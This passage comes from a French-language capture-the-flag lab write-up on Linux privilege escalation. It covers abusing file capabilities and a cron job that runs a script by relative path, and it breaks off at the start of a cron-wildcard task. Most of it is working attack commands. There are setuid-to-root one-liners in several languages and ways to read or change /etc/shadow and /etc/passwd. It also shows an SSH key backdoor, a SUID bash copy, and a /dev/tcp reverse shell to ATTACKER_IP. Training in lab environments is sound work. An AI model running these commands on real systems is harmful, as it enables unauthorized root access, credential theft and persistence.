<span id="cb43-23"><a href="#cb43-23" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. MÉTHODE PERL avec cap_setuid</span></span>
<span id="cb43-24"><a href="#cb43-24" aria-hidden="true" tabindex="-1"></a><span class="co"># Si Perl a cap_setuid+ep</span></span>
<span id="cb43-25"><a href="#cb43-25" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/perl</span> <span class="at">-e</span> <span class="st">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#39;</span></span>
<span id="cb43-26"><a href="#cb43-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-27"><a href="#cb43-27" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. MÉTHODE TAR avec cap_dac_read_search</span></span>
<span id="cb43-28"><a href="#cb43-28" aria-hidden="true" tabindex="-1"></a><span class="co"># Si tar a cap_dac_read_search+ep (permet de lire tous les fichiers)</span></span>
<span id="cb43-29"><a href="#cb43-29" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/tar</span> <span class="at">-cvf</span> /tmp/shadow.tar /etc/shadow</span>
<span id="cb43-30"><a href="#cb43-30" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> <span class="at">-xvf</span> /tmp/shadow.tar <span class="at">-C</span> /tmp/</span>
<span id="cb43-31"><a href="#cb43-31" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /tmp/etc/shadow</span>
<span id="cb43-32"><a href="#cb43-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-33"><a href="#cb43-33" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. MÉTHODE OPENSSL avec cap_setuid</span></span>
<span id="cb43-34"><a href="#cb43-34" aria-hidden="true" tabindex="-1"></a><span class="co"># Si openssl a cap_setuid+ep</span></span>
<span id="cb43-35"><a href="#cb43-35" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/openssl</span> req <span class="at">-x509</span> <span class="at">-newkey</span> rsa:2048 <span class="at">-keyout</span> /tmp/key.pem <span class="at">-out</span> /tmp/cert.pem <span class="at">-days</span> 365 <span class="at">-nodes</span></span>
<span id="cb43-36"><a href="#cb43-36" aria-hidden="true" tabindex="-1"></a><span class="co"># Puis utiliser openssl pour exécuter du code</span></span>
<span id="cb43-37"><a href="#cb43-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-38"><a href="#cb43-38" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. MÉTHODE NODE avec cap_setuid</span></span>
<span id="cb43-39"><a href="#cb43-39" aria-hidden="true" tabindex="-1"></a><span class="co"># Si node a cap_setuid+ep</span></span>
<span id="cb43-40"><a href="#cb43-40" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/node</span> <span class="at">-e</span> <span class="st">&#39;process.setuid(0); require(&quot;child_process&quot;).spawn(&quot;/bin/bash&quot;, {stdio: [0, 1, 2]})&#39;</span></span>
<span id="cb43-41"><a href="#cb43-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-42"><a href="#cb43-42" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. MÉTHODE RUBY avec cap_setuid</span></span>
<span id="cb43-43"><a href="#cb43-43" aria-hidden="true" tabindex="-1"></a><span class="co"># Si ruby a cap_setuid+ep</span></span>
<span id="cb43-44"><a href="#cb43-44" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/ruby</span> <span class="at">-e</span> <span class="st">&#39;Process::Sys.setuid(0); exec &quot;/bin/bash&quot;&#39;</span></span>
<span id="cb43-45"><a href="#cb43-45" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-46"><a href="#cb43-46" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Vérifier que vous êtes root</span></span>
<span id="cb43-47"><a href="#cb43-47" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb43-48"><a href="#cb43-48" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb43-49"><a href="#cb43-49" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-50"><a href="#cb43-50" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Lire le flag</span></span>
<span id="cb43-51"><a href="#cb43-51" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<h3 id="capabilities-linux-expliquées"> Capabilities Linux
expliquées</h3>
<p><strong>Types de capabilities courantes :</strong></p>
<table>
<thead>
<tr class="header">
<th>Capability</th>
<th>Description</th>
<th>Exploitation</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>cap_setuid</td>
<td>Changer l’UID</td>
<td>Devenir root</td>
</tr>
<tr class="even">
<td>cap_setgid</td>
<td>Changer le GID</td>
<td>Accès groupe root</td>
</tr>
<tr class="odd">
<td>cap_dac_read_search</td>
<td>Bypass lecture fichiers</td>
<td>Lire /etc/shadow</td>
</tr>
<tr class="even">
<td>cap_dac_override</td>
<td>Bypass permissions</td>
<td>Modifier fichiers protégés</td>
</tr>
<tr class="odd">
<td>cap_chown</td>
<td>Changer propriétaire</td>
<td>Prendre contrôle fichiers</td>
</tr>
<tr class="even">
<td>cap_fowner</td>
<td>Bypass checks propriétaire</td>
<td>Modifier fichiers</td>
</tr>
<tr class="odd">
<td>cap_sys_admin</td>
<td>Admin système</td>
<td>Multiples exploits</td>
</tr>
</tbody>
</table>
<p><strong>Format des capabilities :</strong></p>
<pre><code>cap_setuid+ep

+e = effective (activée)
+p = permitted (permise)
+i = inherited (héritée)</code></pre>
<h3 id="commandes-dexploitation-par-capability"> Commandes
d’exploitation par capability</h3>
<p><strong>cap_setuid (le plus dangereux) :</strong></p>
<div class="sourceCode" id="cb45"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Python</span></span>
<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> <span class="at">-c</span> <span class="st">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span></span>
<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-4"><a href="#cb45-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Perl</span></span>
<span id="cb45-5"><a href="#cb45-5" aria-hidden="true" tabindex="-1"></a><span class="fu">perl</span> <span class="at">-e</span> <span class="st">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#39;</span></span>
<span id="cb45-6"><a href="#cb45-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-7"><a href="#cb45-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Ruby</span></span>
<span id="cb45-8"><a href="#cb45-8" aria-hidden="true" tabindex="-1"></a><span class="ex">ruby</span> <span class="at">-e</span> <span class="st">&#39;Process::Sys.setuid(0); exec &quot;/bin/bash&quot;&#39;</span></span>
<span id="cb45-9"><a href="#cb45-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb45-10"><a href="#cb45-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Node.js</span></span>
<span id="cb45-11"><a href="#cb45-11" aria-hidden="true" tabindex="-1"></a><span class="ex">node</span> <span class="at">-e</span> <span class="st">&#39;process.setuid(0); require(&quot;child_process&quot;).spawn(&quot;/bin/bash&quot;, {stdio: [0, 1, 2]})&#39;</span></span></code></pre></div>
<p><strong>cap_dac_read_search (lire tous les fichiers) :</strong></p>
<div class="sourceCode" id="cb46"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Tar</span></span>
<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> <span class="at">-cvf</span> /tmp/shadow.tar /etc/shadow</span>
<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> <span class="at">-xvf</span> /tmp/shadow.tar</span>
<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-5"><a href="#cb46-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Vim</span></span>
<span id="cb46-6"><a href="#cb46-6" aria-hidden="true" tabindex="-1"></a><span class="ex">vim</span> /etc/shadow</span>
<span id="cb46-7"><a href="#cb46-7" aria-hidden="true" tabindex="-1"></a><span class="co"># (peut lire même sans permissions)</span></span>
<span id="cb46-8"><a href="#cb46-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-9"><a href="#cb46-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Cat (si a la capability)</span></span>
<span id="cb46-10"><a href="#cb46-10" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span></code></pre></div>
<p><strong>cap_dac_override (modifier tous les fichiers) :</strong></p>
<div class="sourceCode" id="cb47"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Générer un hash</span></span>
<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a><span class="ex">openssl</span> passwd <span class="at">-1</span> password123</span>
<span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb47-4"><a href="#cb47-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Modifier /etc/passwd</span></span>
<span id="cb47-5"><a href="#cb47-5" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;hacker:$1$xyz$...:0:0:root:/root:/bin/bash&#39;</span> <span class="op">&gt;&gt;</span> /etc/passwd</span></code></pre></div>
<h3 id="vérification-des-capabilities"> Vérification des
capabilities</h3>
<div class="sourceCode" id="cb48"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur un binaire spécifique</span></span>
<span id="cb48-2"><a href="#cb48-2" aria-hidden="true" tabindex="-1"></a><span class="ex">getcap</span> /usr/bin/python2.7</span>
<span id="cb48-3"><a href="#cb48-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb48-4"><a href="#cb48-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur tous les binaires</span></span>
<span id="cb48-5"><a href="#cb48-5" aria-hidden="true" tabindex="-1"></a><span class="ex">getcap</span> <span class="at">-r</span> / <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb48-6"><a href="#cb48-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb48-7"><a href="#cb48-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Définir une capability (en tant que root)</span></span>
<span id="cb48-8"><a href="#cb48-8" aria-hidden="true" tabindex="-1"></a><span class="ex">setcap</span> cap_setuid+ep /usr/bin/python2.7</span>
<span id="cb48-9"><a href="#cb48-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb48-10"><a href="#cb48-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Supprimer une capability (en tant que root)</span></span>
<span id="cb48-11"><a href="#cb48-11" aria-hidden="true" tabindex="-1"></a><span class="ex">setcap</span> <span class="at">-r</span> /usr/bin/python2.7</span></code></pre></div>
<h3 id="gtfobins-pour-capabilities"> GTFOBins pour capabilities</h3>
<p>Référence : https://gtfobins.github.io/#+capabilities</p>
<p>Chercher votre binaire et sa capability pour trouver
l’exploitation.</p>
<h3 id="réponse-14"> Réponse</h3>
<p>Shell root obtenu via exploitation de capabilities</p>
<hr />
<h2
id="task-16---privilege-escalation---cron-path"><a name="task-16"></a>Task
16 - Privilege Escalation - Cron (Path)</h2>
<h3 id="objectif-15"> Objectif</h3>
<p>Exploiter une tâche cron qui utilise des chemins relatifs.</p>
<h3 id="commandes-15"> Commandes</h3>
<div class="sourceCode" id="cb49"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Lister les cron jobs</span></span>
<span id="cb49-2"><a href="#cb49-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/crontab</span>
<span id="cb49-3"><a href="#cb49-3" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/cron.d/</span>
<span id="cb49-4"><a href="#cb49-4" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/cron.daily/</span>
<span id="cb49-5"><a href="#cb49-5" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/cron.hourly/</span>
<span id="cb49-6"><a href="#cb49-6" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/cron.monthly/</span>
<span id="cb49-7"><a href="#cb49-7" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/cron.weekly/</span>
<span id="cb49-8"><a href="#cb49-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-9"><a href="#cb49-9" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Vérifier les crons de l&#39;utilisateur</span></span>
<span id="cb49-10"><a href="#cb49-10" aria-hidden="true" tabindex="-1"></a><span class="fu">crontab</span> <span class="at">-l</span></span>
<span id="cb49-11"><a href="#cb49-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-12"><a href="#cb49-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Vérifier les crons système</span></span>
<span id="cb49-13"><a href="#cb49-13" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/crontab</span>
<span id="cb49-14"><a href="#cb49-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-15"><a href="#cb49-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple de sortie vulnérable:</span></span>
<span id="cb49-16"><a href="#cb49-16" aria-hidden="true" tabindex="-1"></a><span class="co"># * * * * * root overwrite.sh</span></span>
<span id="cb49-17"><a href="#cb49-17" aria-hidden="true" tabindex="-1"></a><span class="co"># (Pas de chemin absolu!)</span></span>
<span id="cb49-18"><a href="#cb49-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-19"><a href="#cb49-19" aria-hidden="true" tabindex="-1"></a><span class="co"># PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span>
<span id="cb49-20"><a href="#cb49-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-21"><a href="#cb49-21" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Identifier le PATH utilisé par cron</span></span>
<span id="cb49-22"><a href="#cb49-22" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/crontab <span class="kw">|</span> <span class="fu">grep</span> PATH</span>
<span id="cb49-23"><a href="#cb49-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-24"><a href="#cb49-24" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Créer un script malveillant dans un dossier du PATH accessible en écriture</span></span>
<span id="cb49-25"><a href="#cb49-25" aria-hidden="true" tabindex="-1"></a><span class="co"># Le premier dossier du PATH est souvent /usr/local/sbin ou /usr/local/bin</span></span>
<span id="cb49-26"><a href="#cb49-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-27"><a href="#cb49-27" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier les permissions</span></span>
<span id="cb49-28"><a href="#cb49-28" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/sbin</span>
<span id="cb49-29"><a href="#cb49-29" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/bin</span>
<span id="cb49-30"><a href="#cb49-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-31"><a href="#cb49-31" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Si /usr/local/bin est accessible en écriture</span></span>
<span id="cb49-32"><a href="#cb49-32" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /usr/local/bin/overwrite.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb49-33"><a href="#cb49-33" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb49-34"><a href="#cb49-34" aria-hidden="true" tabindex="-1"></a><span class="st">cp /bin/bash /tmp/rootbash</span></span>
<span id="cb49-35"><a href="#cb49-35" aria-hidden="true" tabindex="-1"></a><span class="st">chmod +s /tmp/rootbash</span></span>
<span id="cb49-36"><a href="#cb49-36" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb49-37"><a href="#cb49-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-38"><a href="#cb49-38" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Rendre le script exécutable</span></span>
<span id="cb49-39"><a href="#cb49-39" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /usr/local/bin/overwrite.sh</span>
<span id="cb49-40"><a href="#cb49-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-41"><a href="#cb49-41" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Attendre que le cron s&#39;exécute (max 1 minute si * * * * *)</span></span>
<span id="cb49-42"><a href="#cb49-42" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier si le fichier est créé</span></span>
<span id="cb49-43"><a href="#cb49-43" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /tmp/rootbash</span>
<span id="cb49-44"><a href="#cb49-44" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-45"><a href="#cb49-45" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Une fois créé, exécuter le bash SUID</span></span>
<span id="cb49-46"><a href="#cb49-46" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/rootbash</span> <span class="at">-p</span></span>
<span id="cb49-47"><a href="#cb49-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-48"><a href="#cb49-48" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Vérifier que vous êtes root</span></span>
<span id="cb49-49"><a href="#cb49-49" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb49-50"><a href="#cb49-50" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb49-51"><a href="#cb49-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-52"><a href="#cb49-52" aria-hidden="true" tabindex="-1"></a><span class="co"># 11. Lire le flag</span></span>
<span id="cb49-53"><a href="#cb49-53" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb49-54"><a href="#cb49-54" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-55"><a href="#cb49-55" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE ALTERNATIVE - Reverse Shell</span></span>
<span id="cb49-56"><a href="#cb49-56" aria-hidden="true" tabindex="-1"></a><span class="co"># 12. Créer un reverse shell</span></span>
<span id="cb49-57"><a href="#cb49-57" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /usr/local/bin/overwrite.sh <span class="op">&lt;&lt; EOF</span></span>
<span id="cb49-58"><a href="#cb49-58" aria-hidden="true" tabindex="-1"></a><span class="st">#!/bin/bash</span></span>
<span id="cb49-59"><a href="#cb49-59" aria-hidden="true" tabindex="-1"></a><span class="st">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</span></span>
<span id="cb49-60"><a href="#cb49-60" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb49-61"><a href="#cb49-61" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-62"><a href="#cb49-62" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /usr/local/bin/overwrite.sh</span>
<span id="cb49-63"><a href="#cb49-63" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-64"><a href="#cb49-64" aria-hidden="true" tabindex="-1"></a><span class="co"># 13. Sur votre machine, démarrer un listener</span></span>
<span id="cb49-65"><a href="#cb49-65" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> 4444</span>
<span id="cb49-66"><a href="#cb49-66" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb49-67"><a href="#cb49-67" aria-hidden="true" tabindex="-1"></a><span class="co"># Attendre la connexion du cron job</span></span></code></pre></div>
<h3 id="analyse-des-cron-jobs"> Analyse des cron jobs</h3>
<p><strong>Fichiers à vérifier :</strong></p>
<div class="sourceCode" id="cb50"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/crontab</span>              <span class="co"># Cron système principal</span></span>
<span id="cb50-2"><a href="#cb50-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/cron.d/*</span>             <span class="co"># Cron jobs additionnels</span></span>
<span id="cb50-3"><a href="#cb50-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/cron.daily/*</span>         <span class="co"># Scripts quotidiens</span></span>
<span id="cb50-4"><a href="#cb50-4" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/cron.hourly/*</span>        <span class="co"># Scripts horaires</span></span>
<span id="cb50-5"><a href="#cb50-5" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/cron.weekly/*</span>        <span class="co"># Scripts hebdomadaires</span></span>
<span id="cb50-6"><a href="#cb50-6" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/cron.monthly/*</span>       <span class="co"># Scripts mensuels</span></span>
<span id="cb50-7"><a href="#cb50-7" aria-hidden="true" tabindex="-1"></a><span class="ex">/var/spool/cron/crontabs/*</span> <span class="co"># Cron utilisateurs</span></span></code></pre></div>
<p><strong>Format d’une ligne crontab :</strong></p>
<pre><code>* * * * * user command
¦ ¦ ¦ ¦ ¦
¦ ¦ ¦ ¦ +--- Jour de la semaine (0-7, 0 et 7 = dimanche)
¦ ¦ ¦ +----- Mois (1-12)
¦ ¦ +------- Jour du mois (1-31)
¦ +--------- Heure (0-23)
+----------- Minute (0-59)</code></pre>
<p><strong>Exemples :</strong></p>
<div class="sourceCode" id="cb52"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> <span class="pp">*</span> <span class="pp">*</span> <span class="pp">*</span> <span class="pp">*</span>     <span class="co"># Chaque minute</span></span>
<span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="ex">*/5</span> <span class="pp">*</span> <span class="pp">*</span> <span class="pp">*</span> <span class="pp">*</span>   <span class="co"># Toutes les 5 minutes</span></span>
<span id="cb52-3"><a href="#cb52-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span> <span class="pp">*</span> <span class="pp">*</span> <span class="pp">*</span> <span class="pp">*</span>     <span class="co"># Chaque heure</span></span>
<span id="cb52-4"><a href="#cb52-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span> 0 <span class="pp">*</span> <span class="pp">*</span> <span class="pp">*</span>     <span class="co"># Chaque jour à minuit</span></span>
<span id="cb52-5"><a href="#cb52-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span> 0 <span class="pp">*</span> <span class="pp">*</span> 0     <span class="co"># Chaque dimanche à minuit</span></span></code></pre></div>
<h3 id="surveillance-des-cron-jobs"> Surveillance des cron jobs</h3>
<p><strong>Méthode 1 - pspy :</strong></p>
<div class="sourceCode" id="cb53"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Télécharger pspy (outil pour surveiller les processus sans root)</span></span>
<span id="cb53-2"><a href="#cb53-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /tmp</span>
<span id="cb53-3"><a href="#cb53-3" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span>
<span id="cb53-4"><a href="#cb53-4" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x pspy64</span>
<span id="cb53-5"><a href="#cb53-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb53-6"><a href="#cb53-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Exécuter pspy</span></span>
<span id="cb53-7"><a href="#cb53-7" aria-hidden="true" tabindex="-1"></a><span class="ex">./pspy64</span></span>
<span id="cb53-8"><a href="#cb53-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb53-9"><a href="#cb53-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Observer les commandes exécutées par cron</span></span></code></pre></div>
<p><strong>Méthode 2 - Logs système :</strong></p>
<div class="sourceCode" id="cb54"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Surveiller les logs cron</span></span>
<span id="cb54-2"><a href="#cb54-2" aria-hidden="true" tabindex="-1"></a><span class="fu">tail</span> <span class="at">-f</span> /var/log/cron.log</span>
<span id="cb54-3"><a href="#cb54-3" aria-hidden="true" tabindex="-1"></a><span class="co"># ou</span></span>
<span id="cb54-4"><a href="#cb54-4" aria-hidden="true" tabindex="-1"></a><span class="fu">tail</span> <span class="at">-f</span> /var/log/syslog <span class="kw">|</span> <span class="fu">grep</span> CRON</span></code></pre></div>
<p><strong>Méthode 3 - Monitoring manuel :</strong></p>
<div class="sourceCode" id="cb55"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer un script pour surveiller</span></span>
<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="fu">true</span><span class="kw">;</span> <span class="cf">do</span></span>
<span id="cb55-3"><a href="#cb55-3" aria-hidden="true" tabindex="-1"></a>  <span class="fu">ps</span> aux <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> grep <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-E</span> <span class="st">&#39;overwrite|backup|cleanup&#39;</span></span>
<span id="cb55-4"><a href="#cb55-4" aria-hidden="true" tabindex="-1"></a>  <span class="fu">sleep</span> 1</span>
<span id="cb55-5"><a href="#cb55-5" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
<h3 id="scripts-malveillants-variés-1"> Scripts malveillants
variés</h3>
<p><strong>Créer un bash SUID :</strong></p>
<div class="sourceCode" id="cb56"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb56-1"><a href="#cb56-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb56-2"><a href="#cb56-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /bin/bash /tmp/rootbash</span>
<span id="cb56-3"><a href="#cb56-3" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +s /tmp/rootbash</span></code></pre></div>
<p><strong>Ajouter une backdoor SSH :</strong></p>
<div class="sourceCode" id="cb57"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb57-2"><a href="#cb57-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;ssh-rsa AAAA... your_key&#39;</span> <span class="op">&gt;&gt;</span> /root/.ssh/authorized_keys</span></code></pre></div>
<p><strong>Ajouter un utilisateur root :</strong></p>
<div class="sourceCode" id="cb58"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb58-1"><a href="#cb58-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb58-2"><a href="#cb58-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;hacker:$1$xyz$F3QzWGa8D0rEJBiOC8kNm0:0:0:root:/root:/bin/bash&#39;</span> <span class="op">&gt;&gt;</span> /etc/passwd</span></code></pre></div>
<p><strong>Modifier /etc/shadow :</strong></p>
<div class="sourceCode" id="cb59"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb59-1"><a href="#cb59-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb59-2"><a href="#cb59-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="st">&#39;s/^root:[^:]*:/root::/&#39;</span> /etc/shadow  <span class="co"># Vide le mot de passe root</span></span></code></pre></div>
<h3 id="réponse-15"> Réponse</h3>
<p>Shell root obtenu via exploitation de PATH dans cron</p>
<hr />
<h2
id="task-17---privilege-escalation---cron-wildcards"><a name="task-17"></a>Task
17 - Privilege Escalation - Cron (Wildcards)</h2>
<h3 id="objectif-16"> Objectif</h3>
<p>Exploiter l’utilisation dangereuse de wildcards dans les scripts
cron.</p>
<h3 id="commandes-16"> Commandes</h3>
<div class="sourceCode" id="cb60"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb60-1"><a href="#cb60-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Examiner le crontab</span></span>
<span id="cb60-2"><a href="#cb60-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/crontab</span>
<span id="cb60-3"><a href="#cb60-3" aria-hidden="true" tabindex="-1"></a></span>
